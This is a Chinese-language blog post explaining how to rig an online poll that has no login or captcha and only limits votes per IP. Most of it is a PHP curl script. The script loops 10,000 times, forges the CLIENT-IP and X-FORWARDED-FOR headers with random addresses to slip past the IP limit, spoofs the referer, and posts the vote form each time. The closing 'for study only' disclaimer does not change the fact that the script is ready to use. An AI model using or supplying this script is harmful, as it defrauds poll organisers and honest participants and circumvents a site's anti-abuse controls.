---
layout: post
title : 投票脚本
category : program
tags : [program,php]
---
{% include JB/setup %}

最近有个投票活动,我看到大部分人都是几百票,然而少数人却是几万票,这明显就是刷票的行为.于是就研究了一下如何刷票.

由于这个投票网站不需要登录,也没有验证码,只是限制了IP而已,所以实现起来比较简单.起初我想用java来写的.但是查了一下资料,进展不是很顺利.突然想起来以前包子在河畔上发过一个php投票脚本.于是找到了这个帖子,研究一了一下.发现curl真是个牛逼的东西.

好了,下面说一下思路.主要是需要知道下面2点:

	1 form的action地址
	2 需要提交的键值

下面是脚本代码:

```php
<?php
for($count = 0; $count < 10000; $count++) {
	//sleep(1)
	// 随机生成IP
	$ip = '';
	for($i = 0; $i < 4; $i++) {
	    $ip .= mt_rand(1,255);
	    if($i == 3) break;
	    $ip .= '.';
	}
	// 设置HTTP头部变量
	$h['CLIENT-IP'] = $ip;
	$h['X-FORWARDED-FOR'] = $ip;
	$header = array();  
	foreach($h as $k => $v ) {  
	    $header[] = $k .':' . $v;  
	}
	// 设置POST信息
	$postData = "这里为需要提交的键值";
	//初始化curl句柄
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "form的action地址");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	// 伪造HTTP头部
	curl_setopt($ch, CURLOPT_HTTPHEADER , $header );
	curl_setopt($ch, CURLOPT_REFERER, "投票页面地址");
	//curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
	$out = curl_exec($ch);
	curl_close ($ch);
	echo $out.' '.$count.' '.$ip;
	echo "\n";
}
?>
```

以上代码仅供交流学习,不要乱用哈!
